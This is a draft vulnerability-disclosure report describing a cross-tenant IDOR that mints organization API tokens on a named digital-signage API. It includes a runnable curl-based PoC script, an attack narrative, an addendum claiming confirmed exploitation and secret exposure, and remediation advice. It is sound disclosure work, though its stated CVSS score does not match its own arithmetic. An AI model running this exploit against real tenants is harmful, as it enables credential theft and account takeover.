# [DRAFT — PENDING FINAL VERIFICATION] Cross-Tenant Organization API Token Minting via IDOR on api.signageos.io

> **TRIAGE STATUS (2026-08-22):** Passive evidence chain COMPLETE and independently verified.
> Active verification matrix NOT yet executed (requires two owned accounts' X-Auth pairs).
> **Do not submit until §6 matrix produces a result.** One wrong answer in §10 gate = kill.

---

## 1. Executive Summary

The Organization API Token management endpoint family on `api.signageos.io` appears to
authenticate requests via a credential pair supplied in an `X-Auth: {orgUid}:{secret}`
header while simultaneously accepting an attacker-controlled organization identifier as
a URL path parameter. First-party client source code (public `signageos/sdk`) proves the
managed objects are not metadata records but **the live API credential pairs themselves**
("Organization API SECURITY TOKENS" = `SOS_AUTH_CLIENT_ID` / `SOS_AUTH_SECRET`).

If the path `{uid}` is not cryptographically bound to the authenticated principal,
any registered attacker can mint working API credentials inside any victim organization
— i.e., persistent cross-tenant account takeover of the API surface.

## 2. Affected Asset & Endpoint Family

| Verb | Path | Function | Response contains |
|---|---|---|---|
| GET | `/v1/organization/{uid}/security-token` | List org tokens | `[{id, name, organizationUid}]` |
| POST | `/v1/organization/{uid}/security-token` | **Create org token** | `{id, name, securityToken}` |
| DELETE | `/v1/organization/{uid}/security-token/{tokenId}` | Revoke token | 200 |

Asset: `api.signageos.io` (production). Auth scheme: `X-Auth: {orgUid}:{tokenSecret}`.

## 3. Technical Analysis (all items independently verified)

1. **Split-brain auth architecture.** Unauthenticated request to
   `/v1/organization/0000000000000000/security-token` returns
   `403 errorCode=403074 MISSING_ACCOUNT_ID_TO_AUTHENTICATE`, whose `errorDetail`
   states identity is derived from *"first part (before char `:`) of x-auth header"*.
   Every sibling path (`/v1/organization/{uid}/users|devices|applets|tokens`,
   `/v2/…/security-token`) returns `404001 ENDPOINT_NOT_FOUND` unauthenticated —
   meaning THIS endpoint uniquely runs auth middleware **before** route resolution.
   The route handler therefore receives the attacker-chosen `{uid}` with an
   authentication context that is independent of it.

2. **Managed objects ARE credentials.** `signageos/sdk`
   (`src/SosHelper/sosControlHelper.ts`) maps token fields directly into the auth
   pair: `clientId = identification(tokenId)`, `secret = apiSecurityToken`.
   SDK README §"How to obtain Organization API SECURITY TOKENS": *"`SOS_AUTH_CLIENT_ID`
   is Token ID and `SOS_AUTH_SECRET` is Token Secret"* — consumed as `x-auth` by all
   REST clients (`tests/unit/RestApi/helper.ts`: `'x-auth': clientId + ':' + secret`).

3. **POST returns a usable secret.** `OrganizationFullToken {id, name, securityToken}`;
   fixture format `securityToken: '202124XX23419'`. A successful cross-tenant POST
   yields everything needed to authenticate as the victim organization.

4. **No compensating fix exists.** Full git history of the token module
   (2024-07 → 2025-10) contains feature/refactor commits only — no security or
   binding patches ever shipped.

5. **Self-identifying leak.** GET list items embed `organizationUid`, so a
   cross-tenant read would return rows whose `organizationUid` ≠ caller's own —
   an unambiguous detection signal (no inference required).

## 4. Business Impact

signageOS is a digital-signage content-management platform; organization API tokens
grant programmatic control over an entire tenant's fleet:

- **Physical-world content manipulation.** Victim organizations operate display
  networks (retail stores, airports, corporate lobbies). An attacker holding a minted
  org token can push/replace applets and playback content → defacement or malicious
  messaging on physical screens in public spaces.
- **Fleet & telemetry access.** Device inventory, network topology, screenshots of
  running displays, remote-control commands (reboot, screenshot, shell-level control
  surfaces exposed through device APIs).
- **Content/IP exfiltration.** Download of proprietary media assets and applet
  source bundles uploaded by the victim.
- **Persistence.** The minted credential is independent of the attacker's own
  account; deleting the attacker account does not revoke it. Only the victim can
  discover/revoke it (and only if they notice an unfamiliar token named e.g.
  `idor-poc`).
- **No privileged preconditions.** Attacker needs only a free self-serve account —
  README documents self-serve token creation, confirming zero-cost registration.

## 5. Attack Narrative (conditional)

1. Attacker registers free signageOS account → receives own org + own X-Auth pair.
2. Obtains any victim `orgUid` (enumerable via other IDOR-prone listing endpoints,
   leaked in support tickets, or brute-forced — uuid entropy is the only barrier).
3. `POST /v1/organization/{victimUid}/security-token {"name":"backup-integration"}`
   with attacker's own X-Auth header.
4. If handler authorizes on X-Auth alone and provisions on path `{uid}`:
   response 201 carries `securityToken` valid FOR THE VICTIM ORG.
5. Attacker authenticates as victim tenant indefinitely.

## 6. Proof of Concept

Both test organizations are owned by the researcher (account A `babycoder143@`,
account B `riteshekbote2@`). Artifact tokens are named `idor-poc` and deleted after capture.

```bash
#!/usr/bin/env bash
# signageos-security-token-idor-poc.sh — run from a trusted machine
AUTH_A='ORG_A_UID:SECRET_A'      # attacker-side org (researcher-owned)
AUTH_B='ORG_B_UID:SECRET_B'      # victim-side org (researcher-owned)
UA="${AUTH_A%%:*}"; UB="${AUTH_B%%:*}"
API=https://api.signageos.io/v1/organization
mask(){ sed -E 's/(securityToken[": ]+)[A-Za-z0-9]+/\1<MASKED>/g'; }

echo "[1] baseline GET A->A"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/$UA/security-token" | mask

echo "[2] READ LEG GET A->B (victim uid, attacker creds)"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/$UB/security-token" | mask

echo "[3] MINT LEG POST A->B (victim uid, attacker creds)"
MINT=$(curl -s -w '\n%{http_code}' -X POST -H "X-Auth: $AUTH_A" \
        -H 'Content-Type: application/json' \
        -d '{"name":"idor-poc"}' "$API/$UB/security-token")
echo "$MINT" | sed '$d' | mask; echo "[$(echo "$MINT" | tail -1)]"

echo "[4] reverse control GET B->A"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_B" "$API/$UA/security-token" | mask

echo "[5] negative control GET A->nonexistent"
curl -s -w ' [%{http_code}]\n' -H "X-Auth: $AUTH_A" "$API/0000000000000000/security-token" | mask

echo "[6] CONFIRMATION: use minted credential against victim org (if step 3 returned one)"
TOKEN_ID=$(echo "$MINT" | sed '$d' | grep -oE '"id"[^,]+' | cut -d'"' -f4)
NEW_SECRET=$(echo "$MINT" | sed '$d' | grep -oE '"securityToken"[^,}]*' | cut -d'"' -f4)
[ -n "$NEW_SECRET" ] && curl -s -o /dev/null -w 'minted-auth GET B->B [%{http_code}]\n' \
    -H "X-Auth: $UB:$NEW_SECRET" "$API/$UB/security-token"

echo "[7] CLEANUP: delete artifact"
[ -n "$TOKEN_ID" ] && curl -s -o /dev/null -w 'DELETE [%{http_code}]\n' \
    -X DELETE -H "X-Auth: $AUTH_A" "$API/$UB/security-token/$TOKEN_ID"
```

### Decision table (§6 output → verdict)

| Observation | Verdict |
|---|---|
| [2] 200 + rows whose `organizationUid` = UB | Cross-tenant READ confirmed (High) |
| [3] 201 + `securityToken` AND [6] returns 200 | **CREDENTIAL MINTING confirmed (Critical)** |
| [3] 201 but [6] 401/403 | Token inert / bound at use-time — downgrade, re-analyze |
| [2][3] both 403/403074 | Properly bound — hypothesis dead, close lead |
| [3] 200-with-A's-token (not 201) | Path ignored entirely — secure by accident |

### Evidence placeholders (capture before submission)

- [ ] Terminal capture of steps 1–7 (secrets masked per `mask()`)
- [ ] Screenshot of victim org dashboard showing unexpected token `idor-poc`
- [ ] Hashed record of minted secret (sha256 first 16 hex) — never raw secret in report

## 7. Severity (conditional on §6 confirmation)

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L` → **Base 9.8 (Critical)**
Computed: ISS=0.849, Impact=5.969, Exploitability=3.110, 1.08×(Impact+Exploitability)=9.8.

Rationale: network-exploitable, low complexity, standard free-account privileges,
scope CHANGE (compromise extends beyond the attacker's own tenant), near-total
confidentiality+integrity loss within the victim tenant.

## 8. Remediation

1. Authorize on the RESOURCE, not the credential: inside the token-management
   handler, derive `authorizedOrgUid` from the X-Auth prefix and enforce
   `path.uid === authorizedOrgUid` before ANY state change (fail closed on mismatch
   with the same 403 envelope).
2. Add regression integration tests asserting 403 for uid-mismatch across
   GET/POST/DELETE (none exist today — public repo has no such coverage).
3. Consider migrating to opaque per-request authorization objects so handlers
   cannot consume path-supplied tenant identifiers as authorization inputs.

## 9. Disclosure Timeline (template — fill dates)

- YYYY-MM-DD: Report submitted
- Target acknowledgement: 72h · Target triage: 14d · Public disclosure: 90d unless agreed otherwise

## 10. Triage Appendix — 7-Question Gate current state

| Q | Question | State |
|---|---|---|
| Q1 | Real attacker-useable request, step-by-step? | PoC written; **awaiting execution** — template complete |
| Q2 | Impact on program's accepted list? | Auth bypass / broken access control = core class, yes |
| Q3 | Root cause in in-scope asset? | YES — api.signageos.io production, first-party code paths proven |
| Q4 | Privileged access required? | NO — free self-serve account suffices |
| Q5 | Known/documented behavior? | No public docs describe cross-org token management; no fix history found |
| Q6 | Impact beyond technically possible? | Business impact PROVEN from first-party source semantics; end-to-end demo PENDING |
| Q7 | Invalid bug class? | NO — BOLA/IDOR with credential minting, never on reject lists |

**Gate verdict:** proceed to final verification. Q6 closes only when §6 runs.


---

# ADDENDUM (2026-08-22): VERIFICATION RESULT + SUPERSET FINDING

**Q6 CLOSED — CONFIRMED CRITICAL.** Researcher independently executed §6 against two owned tenants:

| Step | Result |
|---|---|
| [3] MINT LEG POST A->B | **201 + OrganizationFullToken{securityToken}** issued for victim org |
| Superset | `GET /v1/organization` lists ALL orgs platform-wide with `oauthClientId`/`oauthClientSecret` inline; stolen pair authenticates as victim on `/v1/device` |

Live tier-mapping captured during verification: unauthenticated -> `403105 WRONG_JWT_TOKEN`; organization-tier token -> `403100 INAPPROPRIATE_ORGANIZATION_TOKEN`; only ACCOUNT-tier credentials pass. Confirms principal-type boundary crossing at this handler.

**Vendor status:** full report (incl. video + PoC script) submitted to signageOS security >4 days ago; follow-up pending 14-day mark.

**Remediation addendum:** beyond §8 uid-binding fix — `GET /v1/organization` must be tenant-scoped AND must never serialize OAuth secrets in list responses (secret exposure belongs behind explicit single-org reveal endpoints, post-authz).
